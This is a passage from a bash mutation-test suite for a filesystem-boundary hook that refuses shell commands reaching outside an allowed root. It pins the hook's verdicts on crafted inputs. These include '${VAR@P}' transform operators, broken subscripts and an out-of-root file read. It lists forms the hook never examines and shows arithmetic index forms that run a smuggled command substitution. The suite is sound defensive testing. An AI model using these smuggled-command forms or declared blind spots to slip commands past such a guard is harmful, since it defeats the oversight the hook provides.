XFORM_X_UO='s/^  _split_expansions "\$token" || return 2$/  _split_expansions "$token" || return 1/'
# shellcheck disable=SC2016
XFORM_X_K='s/^                if _span_closed_inside_subscript "\$inner"; then return 1; fi;;$/                :;;/'

XFORM_R="$(xform_copy r "$XFORM_X_R")"
XFORM_S="$(xform_copy s "$XFORM_X_S")"
XFORM_G1A="$(xform_copy g1a "$XFORM_X_G1A")"
XFORM_G1O="$(xform_copy g1o "$XFORM_X_G1O")"
XFORM_T="$(xform_copy t "$XFORM_X_T")"
XFORM_TO="$(xform_copy to "$XFORM_X_TO")"
XFORM_TG5A="$(xform_copy tg5a "$XFORM_X_T" "$XFORM_X_G5A")"
XFORM_F="$(xform_copy f "$XFORM_X_F")"
XFORM_FT="$(xform_copy ft "$XFORM_X_F" "$XFORM_X_T")"
XFORM_W="$(xform_copy w "$XFORM_X_W1" "$XFORM_X_W2")"
XFORM_WT="$(xform_copy wt "$XFORM_X_W1" "$XFORM_X_W2" "$XFORM_X_T")"
XFORM_A="$(xform_copy a "$XFORM_X_A")"
XFORM_AT="$(xform_copy at "$XFORM_X_A" "$XFORM_X_T")"
XFORM_L="$(xform_copy l "$XFORM_X_L")"
XFORM_LT="$(xform_copy lt "$XFORM_X_L" "$XFORM_X_T")"
XFORM_U="$(xform_copy u "$XFORM_X_U")"
XFORM_UO="$(xform_copy uo "$XFORM_X_UO")"
XFORM_K="$(xform_copy k "$XFORM_X_K")"
XFORM_KG5A="$(xform_copy kg5a "$XFORM_X_K" "$XFORM_X_G5A")"

# xform_shape <label> <copy> <lines out> <lines in> — the copy's shape against the shipped
# hook: exactly <lines out> taken out and <lines in> put in, it parses, it refuses an
# untouched out-of-root literal under -001, and it admits an untouched in-root literal.
xform_shape() {
  local xs_d xs_o xs_n xs_why=""
  xs_d="$(/usr/bin/mktemp)"
  /usr/bin/diff "$HOOK" "${2}/block-fs-boundary.sh" > "$xs_d" 2>/dev/null
  xs_o="$(/usr/bin/awk '/^</ { n++ } END { printf "%d", n + 0 }' "$xs_d")"
  xs_n="$(/usr/bin/awk '/^>/ { n++ } END { printf "%d", n + 0 }' "$xs_d")"
  /bin/rm -f "$xs_d"
  if [ "$xs_o" != "$3" ] || [ "$xs_n" != "$4" ]; then
    xs_why="${xs_why} lines -${xs_o}/+${xs_n}, want -${3}/+${4} (an edit no longer targets its line: re-point it, never delete the arm);"
  fi
  /bin/bash -n "${2}/block-fs-boundary.sh" 2>/dev/null || xs_why="${xs_why} the copy does not parse;"
  xform_observe "$2" 'cat /Users/otheruser/notes.txt'
  if [ "$XO_EXIT" != 2 ]; then
    xs_why="${xs_why} liveness: an out-of-root literal exit ${XO_EXIT}, want 2;"
  else
    case "$XO_ERR" in
      *BLOCK-FS-BOUNDARY-001*) : ;;
      *) xs_why="${xs_why} liveness: the out-of-root refusal is not -001;" ;;
    esac
  fi
  xform_observe "$2" 'cat /tmp/ok.txt'
  if [ "$XO_EXIT" != 0 ]; then xs_why="${xs_why} specificity: an in-root literal exit ${XO_EXIT}, want 0;"; fi
  if [ -z "$xs_why" ]; then
    /usr/bin/printf 'PASS: %s\n' "$1"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s —%s\n' "$1" "$xs_why"; FAIL=$((FAIL + 1))
  fi
}
xform_shape "XFORM-MUT-SHAPE-R: the copy whose G6 refuses differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_R" 1 1
xform_shape "XFORM-MUT-SHAPE-S: the copy whose G6 writes no record differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_S" 1 1
xform_shape "XFORM-MUT-SHAPE-G1A: the copy whose G1 admits differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_G1A" 1 1
xform_shape "XFORM-MUT-SHAPE-G1O: the copy whose G1 refuses as outside differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_G1O" 1 1
xform_shape "XFORM-MUT-SHAPE-F: the copy whose walk hands flag-position words over differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_F" 1 1
xform_shape "XFORM-MUT-SHAPE-W: the copy whose walk hands every word of every segment over differs in two lines, parses, and still refuses and admits untouched literals" "$XFORM_W" 2 2
xform_shape "XFORM-MUT-SHAPE-A: the copy whose walk keeps a redirection's ampersand in the verb's segment differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_A" 1 1
xform_shape "XFORM-MUT-SHAPE-L: the copy whose walk joins a continuation line to the line it continues differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_L" 1 1
xform_shape "XFORM-MUT-SHAPE-T: the copy without G2's third limb differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_T" 1 1
xform_shape "XFORM-MUT-SHAPE-TO: the copy whose third limb refuses as outside differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_TO" 1 1
xform_shape "XFORM-MUT-SHAPE-TG5A: T with G5 admitting differs in two lines, parses, and still refuses and admits untouched literals" "$XFORM_TG5A" 2 2
xform_shape "XFORM-MUT-SHAPE-FT: F without the third limb differs in two lines, parses, and still refuses and admits untouched literals" "$XFORM_FT" 2 2
xform_shape "XFORM-MUT-SHAPE-WT: W without the third limb differs in three lines, parses, and still refuses and admits untouched literals" "$XFORM_WT" 3 3
xform_shape "XFORM-MUT-SHAPE-AT: A without the third limb differs in two lines, parses, and still refuses and admits untouched literals" "$XFORM_AT" 2 2
xform_shape "XFORM-MUT-SHAPE-LT: L without the third limb differs in two lines, parses, and still refuses and admits untouched literals" "$XFORM_LT" 2 2
xform_shape "XFORM-MUT-SHAPE-U: the copy whose span split takes an unterminated brace differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_U" 1 1
xform_shape "XFORM-MUT-SHAPE-UO: the copy whose split failure is refused as outside differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_UO" 1 1
xform_shape "XFORM-MUT-SHAPE-K: the copy without the span split's subscript check differs in one line, parses, and still refuses and admits untouched literals" "$XFORM_K" 1 1
xform_shape "XFORM-MUT-SHAPE-KG5A: K with G5 admitting differs in two lines, parses, and still refuses and admits untouched literals" "$XFORM_KG5A" 2 2

# ----- XFORM-SUBJ / XFORM-PFX: the measured pair, and what the pair hides -----
# xform_g2_pin <label> <command> <T exit> <T records> — a G2 refusal (exit 2, -003) with both
# of its pairing arms: T (the third limb removed) must give <T exit> with <T records>
# records, and TO (the limb refuses as outside) must name -001.
xform_g2_pin() {
  xform_pin "$1" "$2" 2 rule BLOCK-FS-BOUNDARY-003
  xform_pair "${1%%:*}-PAIR-exit: through the copy without G2's third limb, the same operand is not refused at G2" \
    "$XFORM_T" "$2" 2 rule BLOCK-FS-BOUNDARY-003   "$3" "$4" -
  xform_pair "${1%%:*}-PAIR-rule: through the copy whose third limb refuses as outside, the refusal names -001 — the -003 reads a live rule" \
    "$XFORM_TO" "$2" 2 rule BLOCK-FS-BOUNDARY-003   2 0 BLOCK-FS-BOUNDARY-001
}
# shellcheck disable=SC2016  # payload text, not expansions
XFORM_C_SUBJ='cat ${CFG@P}'
xform_g2_pin "XFORM-SUBJ-01: unquoted \${VAR@P} is REFUSED at G2 under -003" "$XFORM_C_SUBJ" 0 1

# shellcheck disable=SC2016
XFORM_C_QUOTED='cat "${CFG@P}"'
xform_pin "XFORM-SUBJ-02: QUOTED \${VAR@P} is refused under -003 — by G1, which refuses every quoted brace" \
  "$XFORM_C_QUOTED" 2 rule BLOCK-FS-BOUNDARY-003
xform_pair "XFORM-SUBJ-02-PAIR-exit: through the copy whose G1 admits, the quoted operand is not refused by G1 — SUBJ-02's refusal is G1's" \
  "$XFORM_G1A" "$XFORM_C_QUOTED" 2 rule BLOCK-FS-BOUNDARY-003   0 1 -
xform_pair "XFORM-SUBJ-02-PAIR-rule: through the copy whose G1 refuses as outside, the refusal names -001 — SUBJ-02's -003 reads a live rule" \
  "$XFORM_G1O" "$XFORM_C_QUOTED" 2 rule BLOCK-FS-BOUNDARY-003   2 0 BLOCK-FS-BOUNDARY-001

# The quoted refusal by G1 exists only while the canonicalizer's quote mask does.
# Unbalanced quotes hand the command back unchanged; an apostrophe in a here-document body
# is enough, and the command is still valid shell. Step 1 then strips the quotes and the
# operand is read as its unquoted spelling, which G2's third limb refuses by its shape.
XFORM_C_NOMASK="cat <<'EOF' > /tmp/x.txt${XFORM_NL}it's${XFORM_NL}EOF${XFORM_NL}cat \"\${CFG@P}\""
xform_g2_pin "XFORM-SUBJ-03: QUOTED \${VAR@P} with the quote mask unavailable is REFUSED at G2 under -003" "$XFORM_C_NOMASK" 0 1

# shellcheck disable=SC2016
XFORM_C_PFXIN='cat /tmp/${CFG@P}'
xform_g2_pin "XFORM-PFX-01: behind an in-root literal prefix the operator is REFUSED at G2 under -003" "$XFORM_C_PFXIN" 0 0

# shellcheck disable=SC2016
XFORM_C_PFXOUT='cat /etc/${CFG@P}'
xform_pin "XFORM-PFX-02: behind an out-of-root literal prefix the operand is REFUSED at G2 under -003, before the prefix rule" \
  "$XFORM_C_PFXOUT" 2 rule BLOCK-FS-BOUNDARY-003
xform_pair "XFORM-PFX-02-PAIR-rule: through the copy without G2's third limb, the prefix rule refuses it under -001 — PFX-02's -003 is G2's" \
  "$XFORM_T" "$XFORM_C_PFXOUT" 2 rule BLOCK-FS-BOUNDARY-003   2 0 BLOCK-FS-BOUNDARY-001
xform_pair "XFORM-PFX-02-PAIR-exit: through that copy with G5 admitting, the same operand is admitted silently" \
  "$XFORM_TG5A" "$XFORM_C_PFXOUT" 2 rule BLOCK-FS-BOUNDARY-003   0 0 -

# ----- The refusal covers the operator POSITION, not one letter -----
# xform_g6_pin <label> <command> — a G6 pin (exit 0, one record) with both of its pairing
# arms: R must refuse the command, S must admit it silently. Used by XFORM-RESID below.
xform_g6_pin() {
  xform_pin "$1" "$2" 0 rec 1
  xform_pair "${1%%:*}-PAIR-exit: through the copy whose G6 refuses, the same operand is refused" \
    "$XFORM_R" "$2" 0 rec 1   2 0 BLOCK-FS-BOUNDARY-003
  xform_pair "${1%%:*}-PAIR-rec: through the copy whose G6 writes no record, the same operand is admitted silently" \
    "$XFORM_S" "$2" 0 rec 1   0 0 -
}
# shellcheck disable=SC2016
xform_g2_pin "XFORM-OP-Q: \${VAR@Q} REFUSED at G2" 'cat ${CFG@Q}' 0 1
# shellcheck disable=SC2016
xform_g2_pin "XFORM-OP-Z: \${VAR@Z}, a letter no shell assigns today, REFUSED at G2" 'cat ${CFG@Z}' 0 1
# shellcheck disable=SC2016
xform_g2_pin "XFORM-PARAM-01: indexed element \${arr[0]@P} REFUSED at G2" 'cat ${arr[0]@P}' 0 1
# shellcheck disable=SC2016
xform_g2_pin "XFORM-NEST-01: operator nested in a default word \${A:-\${B@P}} REFUSED at G2" 'cat ${CFG:-${X@P}}' 0 1

# ----- XFORM-POS: words the token walk never hands to the cascade -----
# The cascade sees only the target operands extract_target_tokens emits for a listed verb.
# A flag-position word (it begins with `-`) is skipped there, and an assignment ahead of
# the verb is a prefix the canonicalizer separates from the verb's segment, so neither is
# examined whatever it carries. Pinned, with the walk's own mutation as the pairing, so a
# later change that examines either is a deliberate arm change: through the walk copy G2
# refuses the word, and through the walk copy without the third limb G6 admits it.
# shellcheck disable=SC2016
XFORM_C_FLAG='cat -${CFG@P} /tmp/f'
xform_pin "XFORM-POS-01: the operator in a flag-position word is never examined — admitted, no record (declared exclusion)" \
  "$XFORM_C_FLAG" 0 rec 0
xform_pair "XFORM-POS-01-PAIR-exit: through the copy whose walk hands flag-position words over, G2 refuses the word — POS-01's zero is the walk's" \
  "$XFORM_F" "$XFORM_C_FLAG" 0 rec 0   2 0 BLOCK-FS-BOUNDARY-003
xform_pair "XFORM-POS-01-PAIR-rec: through that copy without the third limb, the word is admitted under G6 with a record" \
  "$XFORM_FT" "$XFORM_C_FLAG" 0 rec 0   0 1 -
# shellcheck disable=SC2016
XFORM_C_ASSIGN='X=${CFG@P} cat /tmp/f'
xform_pin "XFORM-POS-02: the operator in an assignment ahead of the verb is never examined — admitted, no record (declared exclusion)" \
  "$XFORM_C_ASSIGN" 0 rec 0
xform_pair "XFORM-POS-02-PAIR-exit: through the copy whose walk hands every word over, G2 refuses the assignment — POS-02's zero is the walk's" \
  "$XFORM_W" "$XFORM_C_ASSIGN" 0 rec 0   2 0 BLOCK-FS-BOUNDARY-003
xform_pair "XFORM-POS-02-PAIR-rec: through that copy without the third limb, the assignment is admitted under G6 with a record" \
  "$XFORM_WT" "$XFORM_C_ASSIGN" 0 rec 0   0 1 -
# Two operand positions of a listed verb, by the same walk. An ampersand inside a
# redirection operator ends the verb's segment: the walk splits on every `&`, and the
# canonicalizer starts a command after it. And the walk reads one physical line at a time,
# so an operand on a continuation line sits in a record of its own. Each is pinned at
# today's verdict, with the walk mutation that hands the word over as its pairing.
# shellcheck disable=SC2016
XFORM_C_AMPREDIR='cat 2>&1 ${CFG@P}'
xform_pin "XFORM-POS-03: the operator after a redirection operator that carries an ampersand is never examined — admitted, no record (declared exclusion)" \
  "$XFORM_C_AMPREDIR" 0 rec 0
xform_pair "XFORM-POS-03-PAIR-exit: through the copy whose walk keeps a redirection's ampersand in the verb's segment, G2 refuses the operand — POS-03's zero is the walk's" \
  "$XFORM_A" "$XFORM_C_AMPREDIR" 0 rec 0   2 0 BLOCK-FS-BOUNDARY-003
xform_pair "XFORM-POS-03-PAIR-rec: through that copy without the third limb, the operand is admitted under G6 with a record" \
  "$XFORM_AT" "$XFORM_C_AMPREDIR" 0 rec 0   0 1 -
XFORM_C_CONT="cat \\${XFORM_NL}\${CFG@P}"
xform_pin "XFORM-POS-04: the operator on a continuation line is never examined — admitted, no record (declared exclusion)" \
  "$XFORM_C_CONT" 0 rec 0
xform_pair "XFORM-POS-04-PAIR-exit: through the copy whose walk joins a continuation line to the line it continues, G2 refuses the operand — POS-04's zero is the walk's" \
  "$XFORM_L" "$XFORM_C_CONT" 0 rec 0   2 0 BLOCK-FS-BOUNDARY-003
xform_pair "XFORM-POS-04-PAIR-rec: through that copy without the third limb, the operand is admitted under G6 with a record" \
  "$XFORM_LT" "$XFORM_C_CONT" 0 rec 0   0 1 -

# ----- XFORM-NEAR: the named near misses stay allowed -----
# xform_near <label> <command> — a must-not-flag arm (exit 0) with its pairing arm: the
# copy whose G6 refuses must refuse it, so its zero refusals are read with G6 armed.
xform_near() {
  xform_pin "$1" "$2" 0 none
  xform_pair "${1%%:*}-PAIR-exit: through the copy whose G6 refuses, the same near miss is refused" \
    "$XFORM_R" "$2" 0 none -   2 0 BLOCK-FS-BOUNDARY-003
}
# shellcheck disable=SC2016
xform_near "XFORM-NEAR-01: a plain brace form \${VAR} — admitted" 'cat ${CFG}'
# shellcheck disable=SC2016
xform_near "XFORM-NEAR-02: a default value \${VAR:-x} — admitted" 'cat ${CFG:-x}'
# shellcheck disable=SC2016
xform_near "XFORM-NEAR-03: a quoted name with no brace — admitted" 'cat "$HOME/x"'
# shellcheck disable=SC2016
xform_near "XFORM-NEAR-04: an array subscript holding the at-sign \${arr[@]} — admitted" 'cat ${arr[@]}'
# shellcheck disable=SC2016
xform_near "XFORM-NEAR-05: the special-parameter slice \${@:2} — admitted" 'cat ${@:2}'
# shellcheck disable=SC2016
xform_near "XFORM-NEAR-06: the indirection prefix-names form nested in a default word — admitted" 'cat ${CFG:-${!prefix@}}'
# shellcheck disable=SC2016
xform_near "XFORM-NEAR-07: an at-sign in literal text after a brace, with no closing brace — admitted" 'cat ${CFG}/a@b'
# shellcheck disable=SC2016
xform_near "XFORM-NEAR-08: a subscript holding an unbraced expansion \${arr[\$i]} — admitted" 'cat ${arr[$i]}'
# shellcheck disable=SC2016
xform_near "XFORM-NEAR-09: a nested default with no bracket \${CFG:-\${HOME}} — admitted" 'cat ${CFG:-${HOME}}'

# ----- XFORM-OVER: the over-refusal the shape and the span split take, as a decision -----
# G2's shape is wider than the operator: a word ending the same way is refused. The span
# split refuses any span holding a `[` and a nested `${`, which is wider than a span
# closed inside a subscript. Each is pinned so a precision change is a deliberate arm change.
# shellcheck disable=SC2016
xform_g2_pin "XFORM-OVER-01: a default word ending in the shape \${LOG:-a@b} — REFUSED at G2 (declared over-refusal)" 'cat ${LOG:-a@b}' 0 1
# shellcheck disable=SC2016
xform_g2_pin "XFORM-OVER-02: a pattern ending in the shape \${U%@*} — REFUSED at G2 (declared over-refusal)" 'cat ${U%@*}' 0 1
# shellcheck disable=SC2016
xform_g2_pin "XFORM-OVER-03: the subject with a backslash before its dollar — REFUSED at G2, as the escaped command substitution is" 'cat \${CFG@P}' 0 1
# shellcheck disable=SC2016
xform_g2_pin "XFORM-OVER-04: literal text of the shape before the first opener — REFUSED at G2 (declared order-blindness)" 'cat /tmp/a@b}${X}' 0 0
# shellcheck disable=SC2016
xform_g2_pin "XFORM-OVER-11: a replacement whose pattern is the at-sign and whose replacement is empty \${U/@/} — REFUSED at G2 (declared over-refusal)" 'cat ${U/@/}' 0 1
# xform_frag_pin <label> <command> <K exit> <K records> <UO rule> — a span-split refusal
# (exit 2, -003): K (no subscript check) gives <K exit> with <K records> records, and UO
# (the split's failure refused as outside) names <UO rule>.
xform_frag_pin() {
  xform_pin "$1" "$2" 2 rule BLOCK-FS-BOUNDARY-003
  xform_pair "${1%%:*}-PAIR-exit: through the copy without the span split's subscript check, the same command is not refused under -003" \
    "$XFORM_K" "$2" 2 rule BLOCK-FS-BOUNDARY-003   "$3" "$4" -
  xform_pair "${1%%:*}-PAIR-rule: through the copy whose split failure is refused as outside, the refusal names ${5}" \
    "$XFORM_UO" "$2" 2 rule BLOCK-FS-BOUNDARY-003   2 0 "$5"
}
# xform_frag_out_pin <label> <command> — the same refusal behind an out-of-root prefix: K
# hands it to the prefix rule (-001), and KG5A, with G5 admitting, admits it.
xform_frag_out_pin() {
  xform_pin "$1" "$2" 2 rule BLOCK-FS-BOUNDARY-003
  xform_pair "${1%%:*}-PAIR-rule: through the copy without the subscript check, the prefix rule refuses it under -001 — the -003 is the split's" \
    "$XFORM_K" "$2" 2 rule BLOCK-FS-BOUNDARY-003   2 0 BLOCK-FS-BOUNDARY-001
  xform_pair "${1%%:*}-PAIR-exit: through that copy with G5 admitting, the same command is admitted" \
    "$XFORM_KG5A" "$2" 2 rule BLOCK-FS-BOUNDARY-003   0 0 -
}
# shellcheck disable=SC2016
xform_frag_pin "XFORM-OVER-05: a subscript holding a braced expansion, plain — REFUSED by the span split (declared over-refusal)" 'cat ${arr[${i}]}' 0 1 BLOCK-FS-BOUNDARY-001
# shellcheck disable=SC2016
xform_frag_pin "XFORM-OVER-06: a subscript holding a braced expansion, with a default word — REFUSED by the span split (declared over-refusal)" 'cat ${arr[${i}]:-x}' 0 1 BLOCK-FS-BOUNDARY-001
# shellcheck disable=SC2016
xform_frag_out_pin "XFORM-OVER-07: OVER-05's form behind an out-of-root prefix — REFUSED by the span split under -003, not the prefix rule's -001" 'cat /etc/${arr[${i}]}'
# shellcheck disable=SC2016
xform_frag_pin "XFORM-OVER-08: a subscripted parameter whose word nests a braced expansion — REFUSED by the span split (declared over-refusal)" 'cat ${A[0]:-${D}}' 0 1 BLOCK-FS-BOUNDARY-001
# shellcheck disable=SC2016
xform_frag_pin "XFORM-OVER-09: a word nesting a subscripted braced expansion — REFUSED by the span split (declared over-refusal)" 'cat ${X:-${Y[0]}}' 0 1 BLOCK-FS-BOUNDARY-001
# shellcheck disable=SC2016
xform_frag_pin "XFORM-OVER-10: a pattern replacement holding a bracket and a nested braced expansion — REFUSED by the span split (declared over-refusal)" 'cat ${X//[${C}]/_}' 0 1 BLOCK-FS-BOUNDARY-001

# ----- XFORM-SPLIT: two brace forms the span split refuses by where the operand breaks -----
# zsh's flag form and the brace-form command substitution each execute on a shell that
# implements them. The canonicalizer starts a command at the first form's parenthesis and
# after the second form's space, so the walk hands over only an unterminated `${`, which
# the span split refuses. Pinned, each beside a copy whose split admits an unterminated brace.
xform_split_pin() {
  xform_pin "$1" "$2" 2 rule BLOCK-FS-BOUNDARY-003
  xform_pair "${1%%:*}-PAIR-exit: through the copy whose span split takes an unterminated brace, the same command is admitted with a record" \
    "$XFORM_U" "$2" 2 rule BLOCK-FS-BOUNDARY-003   0 1 -
  xform_pair "${1%%:*}-PAIR-rule: through the copy whose split failure is refused as outside, the refusal names -001" \
    "$XFORM_UO" "$2" 2 rule BLOCK-FS-BOUNDARY-003   2 0 BLOCK-FS-BOUNDARY-001
}
# shellcheck disable=SC2016
xform_split_pin "XFORM-SPLIT-01: zsh's flag form — REFUSED by the span split under -003" 'cat ${(e)CFG}'
# shellcheck disable=SC2016
xform_split_pin "XFORM-SPLIT-02: the brace-form command substitution — REFUSED by the span split under -003" 'cat ${ pwd; }'

# ----- XFORM-FRAG: an operator use the walk splits inside a subscript -----
# The operator's subscript holds a braced expansion and is broken inside the subscript.
# The shell reads one word; the walk ends a word at whitespace and a segment at `;`, `&`
# or `|`, and reads one physical line at a time. The word carrying the `${` holds a span
# the split would close inside the subscript, so the split refuses it under -003. Each arm
# is paired through K, where that word passes and the rest of the shell's word is split off.
XFORM_TAB="$(/usr/bin/printf '\t')"
# shellcheck disable=SC2016
xform_frag_pin "XFORM-FRAG-01: subscript broken by a space, in-root prefix — REFUSED by the span split" 'cat /tmp/${arr[${i} 0]@P}' 0 0 BLOCK-FS-BOUNDARY-001
# shellcheck disable=SC2016
xform_frag_pin "XFORM-FRAG-02: subscript broken by a space, no prefix — REFUSED by the span split" 'cat ${arr[${i} 0]@P}' 0 1 BLOCK-FS-BOUNDARY-001
xform_frag_pin "XFORM-FRAG-03: subscript broken by a tab, in-root prefix — REFUSED by the span split" "cat /tmp/\${arr[\${i}${XFORM_TAB}0]@P}" 0 0 BLOCK-FS-BOUNDARY-001
# shellcheck disable=SC2016
xform_frag_pin "XFORM-FRAG-04: subscript broken by a space, write verb — REFUSED by the span split" 'cp /tmp/a /tmp/${arr[${i} 0]@P}' 0 0 BLOCK-FS-BOUNDARY-002
# shellcheck disable=SC2016
xform_frag_pin "XFORM-FRAG-05: subscript broken by a space, then key text — REFUSED by the span split" 'cat /tmp/${map[${k} key]@P}' 0 0 BLOCK-FS-BOUNDARY-001
# shellcheck disable=SC2016
xform_frag_pin "XFORM-FRAG-06: subscript broken by a space, then a dash-led tail the walk skips — REFUSED by the span split" 'cat /tmp/${arr[${i} -1]@P}' 0 0 BLOCK-FS-BOUNDARY-001
# shellcheck disable=SC2016
xform_frag_pin "XFORM-FRAG-07: subscript broken by a pipe — REFUSED by the span split" 'cat /tmp/${arr[${i}|0]@P}' 0 0 BLOCK-FS-BOUNDARY-001
# shellcheck disable=SC2016
xform_frag_pin "XFORM-FRAG-08: subscript broken by an ampersand — REFUSED by the span split" 'cat /tmp/${arr[${i}&0]@P}' 0 0 BLOCK-FS-BOUNDARY-001
# shellcheck disable=SC2016
xform_frag_pin "XFORM-FRAG-09: an associative key broken by a semicolon — REFUSED by the span split" 'cat /tmp/${map[${k};x]@P}' 0 0 BLOCK-FS-BOUNDARY-001
xform_frag_pin "XFORM-FRAG-10: subscript broken by a literal newline — REFUSED by the span split" "cat /tmp/\${arr[\${i}${XFORM_NL}0]@P}" 0 0 BLOCK-FS-BOUNDARY-001
xform_frag_pin "XFORM-FRAG-11: a line continuation before the closing brace — REFUSED by the span split" "cat /tmp/\${arr[\${i}]@P\\${XFORM_NL}}" 0 0 BLOCK-FS-BOUNDARY-001
xform_frag_pin "XFORM-FRAG-12: a line continuation between the at-sign and the letter — REFUSED by the span split" "cat /tmp/\${arr[\${i}]@\\${XFORM_NL}P}" 0 0 BLOCK-FS-BOUNDARY-001
# shellcheck disable=SC2016
xform_frag_pin "XFORM-FRAG-13: the nested expansion itself subscripted, broken by a space — REFUSED by the span split" 'cat /tmp/${arr[${b[0]} 1]@P}' 0 0 BLOCK-FS-BOUNDARY-001
# shellcheck disable=SC2016
xform_frag_out_pin "XFORM-FRAG-14: FRAG-01's form behind an out-of-root prefix — REFUSED by the span split under -003, not the prefix rule's -001" 'cat /etc/${arr[${i} 0]@P}'
# FRAG-15 is the control: a broken subscript with no nested brace leaves an unterminated
# `${`, refused by the existing unterminated-brace rule, not by the subscript check.
# shellcheck disable=SC2016
XFORM_C_FRAG15='cat /tmp/${arr[i 0]@P}'
xform_pin "XFORM-FRAG-15: a broken subscript with no nested brace — REFUSED by the unterminated-brace rule (control)" \
  "$XFORM_C_FRAG15" 2 rule BLOCK-FS-BOUNDARY-003
xform_pair "XFORM-FRAG-15-PAIR-exit: through the copy whose span split takes an unterminated brace, the same command is admitted" \
  "$XFORM_U" "$XFORM_C_FRAG15" 2 rule BLOCK-FS-BOUNDARY-003   0 0 -
xform_pair "XFORM-FRAG-15-PAIR-rule: through the copy whose split failure is refused as outside, the refusal names -001" \
  "$XFORM_UO" "$XFORM_C_FRAG15" 2 rule BLOCK-FS-BOUNDARY-003   2 0 BLOCK-FS-BOUNDARY-001

# ----- XFORM-COST: both checks stay linear by construction -----
# xform_cost_lint <function> [<hook file>] — reads that function's body and prints NO-LIMB,
# FAIL:<reasons>, or LINEAR. A body may hold no loop, no command substitution, no pipe and
# no parameter expansion, and every `case … in <pattern>)` must hold exactly two stars, one
# leading and one trailing — one pass per glob.
xform_cost_lint() {
  /usr/bin/awk -v fn="$1" '
    $0 ~ ("^" fn "\\(\\) \\{") { inb = 1; found = 1; next }
    inb && /^}/ { inb = 0; next }
    inb {
      line = $0
      sub(/^[ \t]*#.*/, "", line)
      sub(/[ \t]+#.*$/, "", line)
      if (line ~ /(^|[^A-Za-z_])(while|for|until)([^A-Za-z_]|$)/) bad = bad " loop"
      if (index(line, "$(") || index(line, "`") || index(line, "|") || index(line, "${")) bad = bad " fork-pipe-expansion"
      if (match(line, / in [^)]*\)/)) {
        p = substr(line, RSTART + 4, RLENGTH - 5)
        n = gsub(/\*/, "*", p)
        if (n != 2 || substr(p, 1, 1) != "*" || substr(p, length(p), 1) != "*") bad = bad " glob"
      }
    }
    END { if (!found) printf "NO-LIMB"; else if (bad != "") printf "FAIL:%s", bad; else printf "LINEAR" }
  ' "${2:-$HOOK}"
}
# xform_cost_arm <label> <function> <find line> <replacement line> — the shipped function
# reads LINEAR, and a copy with <find line> replaced must read a glob failure.
xform_cost_arm() {
  local xk_got xk_ctl xk_copy
  xk_got="$(xform_cost_lint "$2")"
  if [ "$xk_got" = "LINEAR" ]; then
    /usr/bin/printf 'PASS: %s reads LINEAR\n' "$1"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s reads %s, want LINEAR\n' "$1" "$xk_got"; FAIL=$((FAIL + 1))
  fi
  xk_copy="$(/usr/bin/mktemp)"
  XK_A="$3" XK_B="$4" /usr/bin/awk '$0 == ENVIRON["XK_A"] { print ENVIRON["XK_B"]; c++; next } { print } END { if (c != 1) exit 3 }' "$HOOK" > "$xk_copy"
  xk_ctl="$(xform_cost_lint "$2" "$xk_copy")"
  /bin/rm -f "$xk_copy"
  case "$xk_ctl" in
    FAIL:*glob*) /usr/bin/printf 'PASS: %s-CTL the superlinear respelling reads %s\n' "$1" "$xk_ctl"; PASS=$((PASS + 1)) ;;
    *) /usr/bin/printf 'FAIL: %s-CTL the superlinear respelling reads %s, want a glob failure\n' "$1" "$xk_ctl"; FAIL=$((FAIL + 1)) ;;
  esac
}
# shellcheck disable=SC2016
xform_cost_arm "XFORM-COST-01" _carries_transform_op '  case "$1" in *@[!]}]\}*) return 0;; esac' '  case "$1" in *\$\{*@[!]}]\}*) return 0;; esac'
# shellcheck disable=SC2016
xform_cost_arm "XFORM-COST-02" _span_closed_inside_subscript '  case "$1" in *\$\{*) return 0;; esac' '  case "$1" in *\[*\$\{*) return 0;; esac'

# ----- XFORM-RESID: what G2 cannot see at all -----
# An arithmetic context or an indirection re-evaluates ANOTHER variable's value, so a
# command substitution carried there runs although the operand shows no `$(`, no backtick
# and no operator. A lexical guard cannot refuse these without refusing ordinary
# substring, index and indirection forms. The operator's refusal does not close them,
# because they carry nothing in the operand; RESID-04 holds the "they execute" half of
# that reasoning against the interpreter in the same run.
# shellcheck disable=SC2016
xform_g6_pin "XFORM-RESID-01: arithmetic offset \${VAR:off} admitted under G6 with one record — declared limit" 'cat ${CFG:off}'
# shellcheck disable=SC2016
xform_g6_pin "XFORM-RESID-02: arithmetic index \${arr[idx]} admitted under G6 with one record — declared limit" 'cat ${arr[idx]}'
# shellcheck disable=SC2016
xform_g6_pin "XFORM-RESID-03: indirection \${!ref} admitted under G6 with one record — declared limit" 'cat ${!ref}'

# xform_runs: run a one-line program in a named interpreter and report whether it left a
# marker file. A side effect, not captured output, so a diagnostic cannot be mistaken for
# execution. H carries the text of a command substitution; a program that assigns it to
# a variable holds it as DATA until something re-evaluates that variable.
# shellcheck disable=SC2016  # program text for the child shell
XFORM_HIDDEN='$(/usr/bin/touch "$M/marker")'
xform_runs() {   # $1 = interpreter  $2 = program text -> CREATED | absent
  local xr_dir xr_out=absent
  xr_dir="$(/usr/bin/mktemp -d)"
  M="$xr_dir" H="$XFORM_HIDDEN" "$1" -c "$2" >/dev/null 2>&1 || true
  if [ -e "$xr_dir/marker" ]; then xr_out=CREATED; fi
  /bin/rm -rf "$xr_dir"
  /usr/bin/printf '%s' "$xr_out"
}
# shellcheck disable=SC2016  # program text for the child shell
xform_r_ctl="$(xform_runs /bin/bash ': $(/usr/bin/touch "$M/marker")')"
# shellcheck disable=SC2016
xform_r_spec="$(xform_runs /bin/bash 'CFG="$H"; : ${CFG}')"
# shellcheck disable=SC2016
xform_r_off="$(xform_runs /bin/bash 'off="a[$H]"; x=hello; : ${x:off}')"
# shellcheck disable=SC2016
xform_r_idx="$(xform_runs /bin/bash 'idx="a[$H]"; arr=(1 2 3); : ${arr[idx]}')"
# shellcheck disable=SC2016
